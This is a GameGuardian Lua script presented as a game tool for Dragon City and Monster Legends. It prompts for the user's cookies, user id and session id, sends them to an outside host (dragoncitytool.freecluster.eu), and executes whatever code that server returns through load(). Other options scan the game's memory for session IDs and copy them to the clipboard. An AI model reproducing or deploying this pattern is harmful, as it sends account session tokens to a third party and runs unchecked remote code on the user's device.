function Main()
    menu = gg.choice({"🔵Drnogo City🔵", "🔵Monster Legends🔵"}, nil, "🔵Game Tool🔵")
    if menu == 1 then
        as()
        while true do
            if gg.isVisible() then
                gg.setVisible(false)
                as()
            end
        end
    end
    if menu == 2 then
        ae()
        while true do
            if gg.isVisible() then
                gg.setVisible(false)
                ae()
            end
        end
    end
end

function as()
    local input = {}
    local configFile = gg.EXT_CACHE_DIR .. "/" .. gg.getFile():match("") .. "logina.txt"
    local data = loadfile(configFile)
    if data ~= nil then
        data = data()
    end
    input =
        gg.prompt(
        {
            "Cookies-userid-Sessionid check",
            "Cookies",
            "user id",
            "Session id",
            "New Session id 1",
            "New Session id 2",
            "Close"
        },
        data,
        {"checkbox", "text", "number", "number", "checkbox", "checkbox", "checkbox"}
    )
    if input == nil then
    end
    if not input then
        return
    end
    gg.saveVariable(input, configFile)
    SA = "__test=" .. input[2] .. ""
    SE = "" .. input[3] .. ""
    SS = "" .. input[4] .. ""

    if input[1] then
        input[2] = input[2]
        input[3] = input[3]
        input[4] = input[4]
        internet_a =
            gg.makeRequest(
            "http://dragoncitytool.freecluster.eu/user?game=dragoncity&commands=internet&",
            {["Content-Type"] = "application/x-www-form-urlencoded", ["Cookie"] = SA},
            "userid=" .. SE .. "&sessionid=" .. SS .. "&info=" .. SE .. "&"
        ).content
        if not internet_a then
            gg.alert("SERVER: Allow Internet Connection...")
        else
            var = internet_a .. "\ngg.alert('scr executed')"
            pcall(load(internet_a))
            gg.alert(var)
            gg.alert("Error: Time Cookies")
        end
    end

    if input[5] then
        gg.setRanges(gg.REGION_C_ALLOC)
        gg.searchNumber(
            "115;101;115;115;105;111;110;73;100;61;48~57;48~57;48~57;48~57;48~57;48~57;48~57;48~57;38::19",
            gg.TYPE_BYTE,
            false,
            gg.SIGN_EQUAL,
            0,
            -1
        )
        gg.refineNumber(
            "61;48~57;48~57;48~57;48~57;48~57;48~57;48~57;48~57::9",
            gg.TYPE_BYTE,
            false,
            gg.SIGN_EQUAL,
            0,
            -1
        )
        gg.refineNumber("48~57;48~57;48~57;48~57;48~57;48~57;48~57;48~57::8", gg.TYPE_BYTE, false, gg.SIGN_EQUAL, 0, -1)
        local count = gg.getResultCount()
        if count == 0 then
            gg.clearResults()
            gg.alert(count .. " Result found")
            gg.setVisible(true)
            while true do
                if gg.isVisible() then
                    gg.setVisible(false)
                    as()
                end
            end
        else
            local SESA = gg.getResults(8)
            SESA = gg.getValues(SESA)
            gg.alert(
                "[1] Session id: A" ..
                    SESA[1].value ..
                        "AA" ..
                            SESA[2].value ..
                                "AA" ..
                                    SESA[3].value ..
                                        "AA" ..
                                            SESA[4].value ..
                                                "AA" ..
                                                    SESA[5].value ..
                                                        "AA" ..
                                                            SESA[6].value ..
                                                                "AA" ..
                                                                    SESA[7].value .. "AA" .. SESA[8].value .. "A Copy"
            )
            gg.copyText(
                "A" ..
                    SESA[1].value ..
                        "AA" ..
                            SESA[2].value ..
                                "AA" ..
                                    SESA[3].value ..
                                        "AA" ..
                                            SESA[4].value ..
                                                "AA" ..
                                                    SESA[5].value ..
                                                        "AA" ..
                                                            SESA[6].value ..
                                                                "AA" .. SESA[7].value .. "AA" .. SESA[8].value .. "A"
            )
            gg.toast("Success!")
            gg.clearResults()
            gg.setVisible(true)
            while true do
                if gg.isVisible() then
                    gg.setVisible(false)
                    as()
                end
            end
        end
    end

    if input[6] then
        gg.setRanges(gg.REGION_C_ALLOC)
        gg.searchNumber(
            "115;101;115;115;105;111;110;73;100;61;48~57;48~57;48~57;48~57;48~57;48~57;48~57;38::18",
            gg.TYPE_BYTE,
            false,
            gg.SIGN_EQUAL,
            0,
            -1
        )
        gg.refineNumber("61;48~57;48~57;48~57;48~57;48~57;48~57;48~57::8", gg.TYPE_BYTE, false, gg.SIGN_EQUAL, 0, -1)
        gg.refineNumber("48~57;48~57;48~57;48~57;48~57;48~57;48~57::7", gg.TYPE_BYTE, false, gg.SIGN_EQUAL, 0, -1)
        local count = gg.getResultCount()
        if count == 0 then
            gg.clearResults()
            gg.alert(count .. " Result found")
            gg.setVisible(true)
            while true do
                if gg.isVisible() then
                    gg.setVisible(false)
                    as()
                end
            end
        else
            local SESS = gg.getResults(7)
            SESS = gg.getValues(SESS)
            gg.alert(
                "[2] Session id: A" ..
                    SESS[1].value ..
                        "AA" ..
                            SESS[2].value ..
                                "AA" ..
                                    SESS[3].value ..
                                        "AA" ..
                                            SESS[4].value ..
                                                "AA" ..
                                                    SESS[5].value ..
                                                        "AA" .. SESS[6].value .. "AA" .. SESS[7].value .. "A Copy"
            )
            gg.copyText(
                "A" ..
                    SESS[1].value ..
                        "AA" ..
                            SESS[2].value ..
                                "AA" ..
                                    SESS[3].value ..
                                        "AA" ..
                                            SESS[4].value ..
                                                "AA" ..
                                                    SESS[5].value ..
                                                        "AA" .. SESS[6].value .. "AA" .. SESS[7].value .. "A"
            )
            gg.toast("Success!")
            gg.clearResults()
            gg.setVisible(true)
            while true do
                if gg.isVisible() then
                    gg.setVisible(false)
                    as()
                end
            end
        end
    end

    if input[7] then
        gg.setVisible(true)
        while true do
            if gg.isVisible() then
                gg.setVisible(false)
                Main()
            end
        end
    end
end

function ae()
    local input = {}
    local configFile = gg.EXT_CACHE_DIR .. "/" .. gg.getFile():match("") .. "logine.txt"
    local data = loadfile(configFile)
    if data ~= nil then
        data = data()
    end
    input =
        gg.prompt({"Cookies-user check", "Cookies", "user", "Close"}, data, {"checkbox", "text", "number", "checkbox"})
    if input == nil then
    end
    if not input then
        return
    end
    gg.saveVariable(input, configFile)
    SA = "__test=" .. input[2] .. ""
    SE = "" .. input[3] .. ""
    if input[1] then
        input[2] = input[2]
        input[3] = input[3]
        L =
            gg.makeRequest(
            "http://dragoncitytool.freecluster.eu/user?game=monsterlegends&commands=internet&",
            {["Cookie"] = SA},
            "userid=" .. SE .. "&"
        ).content
        if not L then
            gg.alert("SERVER: Allow Internet Connection...")
        else
            pcall(load(L))
            gg.alert("Error: Time Cookies")
        end
    end

    if input[4] then
        gg.setVisible(true)
        while true do
            if gg.isVisible() then
                gg.setVisible(false)
                Main()
            end
        end
    end
end

gg.setVisible(true)
while true do
    if gg.isVisible() then
        gg.setVisible(false)
        Main()
    end
end
